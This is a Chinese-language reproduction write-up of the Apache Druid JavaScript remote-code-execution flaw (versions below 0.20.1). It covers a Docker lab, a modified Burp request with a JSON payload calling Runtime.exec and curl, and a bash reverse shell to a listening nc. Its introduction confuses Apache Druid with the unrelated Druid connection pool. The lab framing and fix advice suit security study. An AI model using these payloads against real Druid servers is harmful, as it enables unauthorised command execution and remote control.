漏洞简介

Druid不仅是一个数据库连接池，还包含一个ProxyDriver、一系列内置的JDBC组件库、一个SQL Parser。支持所有JDBC兼容的数据库，包括Oracle、MySql、Derby、Postgresql、SQL Server、H2等。

Apache Druid 包括执行用户提供的 JavaScript 的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在 Druid 0.20.0 及更低版本中，经过身份验证的用户可以构造传入的json串来控制一些敏感的参数发送恶意请求，利用 Apache Druid 漏洞可以执行任意代码。

 

影响版本

Apache Druid < 0.20.1

漏洞环境：靶机使用centos 7.5下的docker环境搭建，攻击机 kali

 

环境搭建：

此次复现我们的环境使用的是docker所拉取的镜像，首先保证你的靶机中已经部署好docker环境。所用版本为Apache Druid：0.16.0。

docker pull fokkodriesprong/docker-druid

docker run -i -p 8888:8888 fokkodriesprong/docker-druid

-i参数是以交互模式运行容器

-p参数是将靶机的8888端口映射到容器的8888端口

接下来，通过ip加端口的形式去访问这个服务

接下来点击Load data -> Local disk

填入一下信息

在Base directory中填入quickstart/tutorial/

在File filter中填入wikiticker-2015-09-12-sampled.json.gz

接下来点击next按钮，如果不能点击，单击一下preview按钮，接下来的页面采用默认即可，一直单击next按钮。

直到filter页面，先单击add cilumn filter按钮，输入下面图片中的参数。

然后一路单击next按钮可以完成配置，需要注意的是，漏洞触发点就在此处，各位在抓包时可以进行详细的观察，此处不进行赘述。

在此时，我们进行抓包操作，此时抓到的post包应该如下图所示：

我们修改其中的参数，用来进行命令执行。

修改的参数内容为：

{    "type":"javascript",    "function":"function(value){return java.lang.Runtime.getRuntime().exec('curl ip:8000')}",    "dimension":"added",    "":{    "enabled":"true"    }}


接下来，我们变换一下参数的内容，用来进行反弹shell，将exec中的参数变成下面的参数：

'/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/ip/port 0>&1'

在放包之前，我们先在kali中起一个nc，监听一下端口。

 

此时，我们将修改好的post包点击重放，在burp里面显示已经成功获取到响应包，现在再看监听的端口，发现已经反弹到shell。


 

修复建议：

将Apache Druid 升级到最新版本，或者对Apache Druid的权限进行控制，只允许受信任的主机访问集群服务器。
